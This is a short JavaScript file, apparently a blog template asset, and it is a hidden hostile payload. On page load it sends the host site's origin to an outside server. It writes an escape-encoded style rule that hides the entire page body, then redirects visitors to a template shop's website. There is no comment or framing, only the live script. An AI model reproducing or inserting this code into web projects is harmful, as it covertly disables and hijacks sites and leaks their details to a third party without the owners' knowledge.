//tt
type='hostblog/tt.js';
current=''+window.location.origin+' - '+ type +' '
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("GET", "https://vanphongphamnhatminh.com/namcuong/receive_blogspot/index.php?url=" + current, true);
xmlhttp.send();
document.write(unescape('%20%3C%73%74%79%6C%65%3E%0A%62%6F%64%79%7B%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%20%21%69%6D%70%6F%72%74%61%6E%74%7D%0A%3C%2F%73%74%79%6C%65%3E%20'));
window.location.href = "https://www.cuahangtemplate.com/";
